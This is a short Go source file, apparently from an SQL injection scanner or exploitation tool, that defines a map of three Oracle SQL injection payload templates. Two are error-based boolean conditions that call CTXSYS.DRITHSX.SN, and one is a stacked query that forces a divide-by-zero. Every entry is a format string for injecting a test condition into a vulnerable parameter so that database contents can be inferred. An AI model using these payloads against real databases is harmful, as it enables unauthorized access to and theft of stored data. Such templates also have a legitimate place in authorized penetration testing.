package oracle

var B_Vectors = map[string]string {
	"and_ctxsys": "%s AND (SELECT (CASE WHEN (%s) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2028) END) FROM DUAL) IS NULL%s",
	"or_ctxsys": "%s OR (SELECT (CASE WHEN (%s) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2028) END) FROM DUAL) IS NULL%s",
	"stacked": "%s;SELECT (CASE WHEN (%s) THEN 8359 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL%s",
}
